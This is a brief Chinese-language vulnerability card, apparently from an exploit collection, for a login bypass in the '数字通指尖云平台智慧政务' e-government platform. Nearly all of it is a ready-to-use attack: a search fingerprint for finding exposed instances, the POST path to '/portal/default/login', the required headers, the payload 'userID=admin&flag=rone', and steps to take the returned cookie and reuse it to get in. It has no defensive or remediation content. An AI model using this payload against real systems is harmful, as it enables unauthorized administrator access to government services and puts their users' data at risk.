# 数字通指尖云平台智慧政务login存在登录绕过漏洞

- **系统**：数字通指尖云平台智慧政务　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="assets/8cca19ff/css/bootstrap-yii.css"`
- **请求**：`POST /portal/default/login HTTP/1.1`
- **关键头**：`Priority: u=0, i`　`Content-Type: application/x-www-form-urlencoded`　`Accept-Ldwk: bG91ZG9uZ3dlbmt1`

**请求体 / payload**
```
userID=admin&flag=rone
请求获取cookie
添加Cookie访问[https://ip/](http://ip/)
```
- **预期**：200　|　—